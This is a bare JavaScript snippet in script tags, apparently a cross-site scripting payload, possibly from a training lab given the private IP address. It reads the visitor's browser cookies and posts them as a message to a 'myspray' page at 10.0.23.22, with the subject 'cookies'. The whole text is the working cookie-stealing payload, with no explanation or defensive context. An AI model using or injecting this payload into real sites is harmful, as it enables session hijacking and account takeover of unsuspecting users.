<script>
xhr = new XMLHttpRequest();
xhr.open("POST", "http://10.0.23.22/myspray/writemessage92.html", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.send("message="+document.cookie+"&subject=cookies");
</script>
